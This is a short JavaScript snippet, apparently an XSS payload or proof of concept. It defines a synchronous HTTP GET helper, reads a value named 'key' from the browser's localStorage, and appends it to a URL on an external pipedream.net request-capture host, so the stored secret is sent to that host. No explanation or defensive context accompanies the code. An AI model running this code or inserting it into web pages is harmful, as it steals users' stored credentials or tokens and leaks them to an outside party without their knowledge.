function httpGet(theUrl)
{
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
    xmlHttp.send( null );
    return xmlHttp.responseText;
}

var key = localStorage.getItem('key');
var url = "https://enn9ofv4bifre.x.pipedream.net/?local=" + key;  
httpGet(url)
